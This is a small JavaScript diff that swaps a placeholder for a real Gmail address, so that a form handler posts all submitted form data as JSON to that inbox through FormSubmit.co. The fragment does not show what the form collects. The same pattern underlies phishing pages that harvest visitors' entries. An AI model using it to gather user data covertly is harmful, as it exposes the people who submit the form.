@@ -48,7 +48,7 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiUrl = "https://formsubmit.co/ajax/your-email@example.com"; // Replace "your-email@example.com" with your FormSubmit.co email
+    let apiUrl = "https://formsubmit.co/ajax/webt12348@gmail.com"; // Replace "your-email@example.com" with your FormSubmit.co email
 
     let formData = new FormData();
     formData.append("form_data", JSON.stringify(strings));
